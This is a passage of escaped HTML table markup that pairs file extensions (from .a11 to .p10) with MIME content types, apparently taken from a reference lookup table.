&lt;td style=&#34;text-align:left&#34;&gt;.a11&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-a11&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.acp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-mei-aac&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ai&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/postscript&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.aif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/aiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.aifc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/aiff&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.aiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/aiff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.anv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-anv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.asa&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/asa&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.asf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-asf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.asp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/asp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.asx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ms-asf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.au&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/basic&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.avi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/avi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.awf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.workflow&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.biz&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.bmp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-bmp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.bot&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-bot&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.c4t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-c4t&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.c90&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-c90&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cal&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cals&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cat&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-pki.seccat&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-netcdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cdr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cdr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cel&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cel&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cer&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-x509-ca-cert&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cg4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-g4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cgm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cgm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cit&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cit&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.class&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;java/*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cmp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cmx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cmx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cot&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cot&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.crl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pkix-crl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.crt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-x509-ca-cert&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.csi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-csi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.css&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/css&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.cut&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-cut&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dbf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dbf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dbm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dbm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dbx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dbx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dcd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dcx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dcx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.der&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-x509-ca-cert&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dgn&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dgn&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dib&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dib&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dll&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-msdownload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.doc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/msword&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dot&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/msword&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.drw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-drw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dtd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dwf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Model/vnd.dwf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dwf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dwf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dwg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dwg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dxb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dxb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.dxf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-dxf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.edn&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.adobe.edn&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.emf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-emf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.eml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;message/rfc822&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ent&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.epi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-epi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.eps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.eps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/postscript&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.etd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ebx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.exe&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-msdownload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.fax&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/fax&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.fdf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.fdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.fif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/fractals&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.fo&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.frm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-frm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.g4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-g4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.gbr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-gbr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.gif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/gif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.gl2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-gl2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.gp4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-gp4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hgl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-hgl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hmr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-hmr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-hpgl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hpl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-hpl&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hqx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/mac-binhex40&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hrf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-hrf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.hta&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/hta&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.htc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/x-component&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.htm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.htt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/webviewhtml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.htx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.icb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-icb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ico&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/x-icon&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ico&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ico&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.iff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-iff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ig4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-g4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.igs&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-igs&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.iii&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-iphone&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.img&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-img&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ins&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-internet-signup&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.isp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-internet-signup&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.IVF&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-ivf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.java&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;java/*&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jfif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jpe&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/jpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jpe&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-jpe&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/jpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-jpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.js&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-javascript&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.jsp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/html&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.la1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-liquid-file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.lar&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-laplayer-reg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.latex&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-latex&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.lavs&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-liquid-secure&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.lbm&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-lbm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.lmsff&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-la-lms&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ls&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-javascript&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.ltr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-ltr&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.m1v&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-mpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.m2v&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-mpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.m3u&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mpegurl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.m4e&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpeg4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mac&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-mac&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.man&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-troff-man&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.math&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mdb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/msaccess&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mdb&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-mdb&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mfp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-shockwave-flash&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mht&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;message/rfc822&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mhtml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;message/rfc822&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-mi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mid&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mid&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.midi&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mid&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mil&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-mil&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mnd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-musicnet-download&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mns&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/x-musicnet-stream&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mocha&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-javascript&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.movie&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-sgi-movie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mp1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mp1&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mp2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mp2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mp2v&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mp3&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/mp3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mp4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpeg4&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpa&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-mpg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpd&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-project&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpe&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-mpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpga&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;audio/rn-mpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-project&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mps&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/x-mpeg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpt&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-project&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpv&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpg&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpv2&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;video/mpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpw&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-project&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mpx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/vnd.ms-project&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mtx&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/xml&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.mxp&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-mmxp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.net&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/pnetvue&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.nrf&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-nrf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.nws&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;message/rfc822&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.odc&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/x-ms-odc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.out&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-out&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p10&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/pkcs10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.p12&lt;/td&gt;
